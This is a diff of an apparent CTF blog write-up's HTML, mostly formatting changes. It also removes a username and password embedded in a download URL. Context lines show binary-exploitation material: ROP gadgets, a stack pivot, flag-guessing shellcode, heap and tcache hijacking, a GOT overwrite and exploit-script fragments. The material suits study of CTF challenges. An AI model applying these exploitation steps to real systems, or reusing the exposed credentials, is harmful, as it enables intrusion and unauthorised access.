@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="My resources download center"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="My resources download center"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li
@@ -265,15 +265,14 @@
 <p>The detail information of each stage is following.</p>
 <h3 id="1-1-get-limited-gadgets-for-binary">1-1 get limited gadgets for binary</h3>
 <p>This challenge is just about <code>ROP</code> attack, but it&rsquo;s more complicated than other normal <code>ROP</code> challenges. Because there are not enough gadgets to use. No <code>csu</code> gadgets and only two <code>ppr</code> gadgets exist:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x000000000040114d: pop rbp; ret;
-</span></span><span class="line"><span class="cl">0x000000000040116a: pop rdi; ret;
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">0x000000000040116a: pop rdi; ret;</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Fortunately, the magic gadget <code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code> can be used, its opcode is <code>015dc3</code>.  To find this gadget by the command: <code>ropper -f ./chall --opcode 015dc3</code>。</p>
 <p>In fact, the magic gadget is powerful, we can change the content of the address if <code>rbp</code> and <code>rbx</code> register is controlled. And we don&rsquo;t need to leak any address, since the base address makes no difference for <code>add</code> operator. Now, we can control <code>rbp</code> by <code>pop rbp; ret</code>, and we need to find a gadget to control <code>rbx</code> register.</p>
@@ -284,7 +283,7 @@
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002231442367.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002231442367.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002231442367.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002231442367.png 2x" sizes="auto" data-title="image-20221002231442367" data-alt="image-20221002231442367" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>Once <code>r12</code> is writable, we can do <code>stack pivot</code> and call this gadget to control <code>rbx</code> register, and we&rsquo;re able to use <code>magic gadget</code> to change other libc-address left at <code>.bss</code>.</p>
 <p>In above image, the layout of <code>rop</code> data should be:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -293,11 +292,10 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pop rbp; ret
 </span></span><span class="line"><span class="cl">0x404378
-</span></span><span class="line"><span class="cl">leave; ret
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">leave; ret</span></span></code></pre></td></tr></table>
 </div>
 </div><p>And we need to put data at <code>0x404388</code> before doing <code>stack pivot</code>，just input by <code>gets</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -306,8 +304,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pop rdi; ret
 </span></span><span class="line"><span class="cl">0x404388
-</span></span><span class="line"><span class="cl">elf.plt.gets
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">elf.plt.gets</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002232421924.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002232421924.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002232421924.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221002232421924.png 2x" sizes="auto" data-title="image-20221002232421924" data-alt="image-20221002232421924" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>At first, I choose to use <code>magic gadget</code> to change <code>0x7f2b2e0c0514 (_IO_getline_info+292)</code> to <code>0x7f2b2e0c0527 (_IO_getline_info+311)</code>. Because the <code>r12</code> register is not always writable.</p>
@@ -345,7 +342,7 @@
 <li>wait for read if we guess right, otherwise kill the problem</li>
 </ul>
 <p>Therefor, the shellcode is:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -408,13 +405,12 @@
 </span></span><span class="line"><span class="cl">syscall
 </span></span><span class="line"><span class="cl">mov rax, 60
 </span></span><span class="line"><span class="cl">syscall
-</span></span><span class="line"><span class="cl">&#34;&#34;&#34;.format(index, guess_chr)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">&#34;&#34;&#34;.format(index, guess_chr)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>The format of flag is <code>SEKAI\{[A-Z_]+\}</code>, so index starts at <code>6</code>.</p>
 <h3 id="1-6-exp">1-6 EXP</h3>
 <p><code>exp.py</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -845,11 +841,10 @@
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;guess right: &#34;</span><span class="p">,</span> <span class="n">guess_chr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>and <code>bruteforce.py</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -882,8 +877,7 @@
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&#34;}&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Please install <a href="https://github.com/RoderickChan/pwncli"target="_blank" rel="external nofollow noopener noreferrer">RoderickChan/pwncli: Do pwn by cli (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> if you want to use my exp, then <code>python3 bruteforce.py</code> to get the flag.</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003003258313.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003003258313.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003003258313.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003003258313.png 2x" sizes="auto" data-title="image-20221003003258313" data-alt="image-20221003003258313" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -904,7 +898,7 @@
 <h3 id="2-1-analysis-of-program">2-1 analysis of program</h3>
 <p>As the source code is given, I will analyze the program based on that. It&rsquo;s BSF algorithm to find the short path in an undirected graph. The edge has no direction because it&rsquo;s adjacent matrix is symmetric.</p>
 <p>I write my analysis on comment.</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1073,8 +1067,7 @@
 </span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">crawl</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>It&rsquo;s obvious that the vulnerability of this program is that <code>from</code> and <code>dest</code> are not checked, and we can input large number to cause overflow.</p>
 <p>There&rsquo;re two vulns for read and write:</p>
@@ -1082,7 +1075,7 @@
 <p><strong>Read</strong>: At <code>overflow1</code>, we can change the content of the address without leaking, like using a <code>add</code> gadgets.</p>
 <p>The type of these two variables is <code>uint</code>, as we can overflow to read and write data at higher address, but cannot read/write lower address.</p>
 <p>The layout of heap in this program after initial:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1093,13 +1086,12 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">low address ---&gt; queue
 </span></span><span class="line"><span class="cl">                 vis
 </span></span><span class="line"><span class="cl">                 parent
-</span></span><span class="line"><span class="cl">high address---&gt; adj_matrix         
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">high address---&gt; adj_matrix         </span></span></code></pre></td></tr></table>
 </div>
 </div><p>In order to leak and write useful data, we need to allocate chunks after <code>adj_matrix</code>. So how to trigger <code>malloc</code> and <code>free</code>, the answer is in <code>std:queue</code>.</p>
 <h3 id="2-2-mechanism-of-stdqueue">2-2 mechanism of std::queue</h3>
 <p>I also don&rsquo;t know the mechanism of <code>std:queue</code> when I started to solve the task, so I write a test program to trace the chunk operations when <code>std::queue</code> is used.</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1228,8 +1220,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;end end!!!&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Compile the file and use <a href="https://github.com/Arinerron/heaptrace"target="_blank" rel="external nofollow noopener noreferrer">Arinerron/heaptrace: helps visualize heap operations for pwn and debugging (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a> to analyze.</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003094403204.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003094403204.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003094403204.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003094403204.png 2x" sizes="auto" data-title="image-20221003094403204" data-alt="image-20221003094403204" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -1239,7 +1230,7 @@
 <p>In a word, we can allocate chunk by <code>queue.push</code> and free chunk by <code>queue.pop</code>.</p>
 <h3 id="2-4-malloc-and-free-chunks-using-stdqueue">2-4 malloc and free chunks using std::queue</h3>
 <p>Look at the function <code>bfs</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1282,12 +1273,11 @@
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>On the one hand, we can push items in the for loop, and let it return, so the queue will not be cleared. Let node <code>X</code> connects to all other nodes, and input <code>from=X</code>, <code>dest=255</code>, then in <code>bfs</code>, <code>255</code> items are added in the queue and it will return because node <code>X</code> is connected to node <code>255</code>.</p>
 <p>The snippet to trigger malloc:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1312,8 +1302,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">from_</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">num</span><span class="o">-</span><span class="mi">1</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Testcase #&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">push_nodes</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">push_nodes</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>On the other hand, we can specify <code>n = 0</code>, then the queue is cleared and trigger free chunks.</p>
 <h3 id="2-5-leak-heap-address-and-hijack-tcache-next">2-5 leak heap address and hijack tcache-&gt;next</h3>
@@ -1321,19 +1310,18 @@
 <p>I choose to allocate at <code>0x4073e0</code>, the address of <code>adj_matrix</code>, and makes <code>adj_matrix</code> be zero.</p>
 <h3 id="2-6-calculate-the-appropriate-i-and-j-for-adj_matrix">2-6 calculate the appropriate i and j for adj_matrix</h3>
 <p>Now the <code>adj_matrix</code> is <code>0</code>, the problem is how to change the content of target address by <code>adj_matrix</code> overflow. It&rsquo;s just a basic quadratic equation.</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">256 * i + j = t1 (1)
-</span></span><span class="line"><span class="cl">i + 256 * j = t2 (2)
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">i + 256 * j = t2 (2)</span></span></code></pre></td></tr></table>
 </div>
 </div><p>As we know the address of heap area, let <code>t1 = got.plt address</code> and <code>t2 = heap address</code>. When <code>j</code> increases <code>1</code>, the <code>equation (2)</code> would increases <code>256</code>, the heap area is large enough and <code>t2 + 256 * X</code> is always writable.</p>
 <p>snippet:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1356,8 +1344,7 @@
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># 0x407048 --&gt; got.plt@~basic_string</span>
-</span></span><span class="line"><span class="cl"><span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">func11</span><span class="p">(</span><span class="mh">0x407048</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">func11</span><span class="p">(</span><span class="mh">0x407048</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Then, write <code>got.plt@std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string</code> to <code>0x401925</code>:</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003101918347.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003101918347.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003101918347.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003101918347.png 2x" sizes="auto" data-title="image-20221003101918347" data-alt="image-20221003101918347" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -1370,7 +1357,7 @@
 <p>Pop shell:</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003102845084.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003102845084.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003102845084.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003102845084.png 2x" sizes="auto" data-title="image-20221003102845084" data-alt="image-20221003102845084" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="2-8-exp">2-8 EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1675,8 +1662,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="s2">&#34;0 0&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Attack remote host:</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003103106963.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003103106963.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003103106963.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20221003103106963.png 2x" sizes="auto" data-title="image-20221003103106963" data-alt="image-20221003103106963" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
